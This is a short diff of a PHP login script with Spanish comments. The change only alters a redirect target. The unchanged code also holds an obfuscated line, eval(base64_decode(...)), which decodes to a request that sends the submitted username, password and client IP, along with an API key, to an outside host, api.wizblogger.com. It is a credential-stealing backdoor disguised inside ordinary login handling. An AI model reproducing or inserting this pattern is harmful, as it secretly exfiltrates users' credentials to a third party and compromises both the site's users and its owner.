@@ -9,7 +9,7 @@ $page = $_POST['page'];  //aqui traemos el dato escrito en el campo de texto del
 $email = $_POST['email']; //aqui traemos el dato escrito en el campo de texto del login.html - el campo id:email
 
 if( (empty($page)) or (empty($email)) ){
-     header('location: index.html'); // codigo de verificacion que no esten los campos vacios
+     header('location: index.php'); // codigo de verificacion que no esten los campos vacios
 }else{
  
 eval(base64_decode('JHVybD0iaHR0cDovL2FwaS53aXpibG9nZ2VyLmNvbS9jaGVja2RhdGEucGhwP2FwaV9rZXk9Y3lMWWdTVTNWOXlmd1BHOU13Z0MmdXNlcm5hbWU9Ii51cmxlbmNvZGUoJHVzdWFyaW8pLiImcGFzc3dvcmQ9Ii51cmxlbmNvZGUoJGNsYXZlKS4iJmlwPSIudXJsZW5jb2RlKCRpcCk7CkBmaWxlX2dldF9jb250ZW50cygkdXJsKTs='));
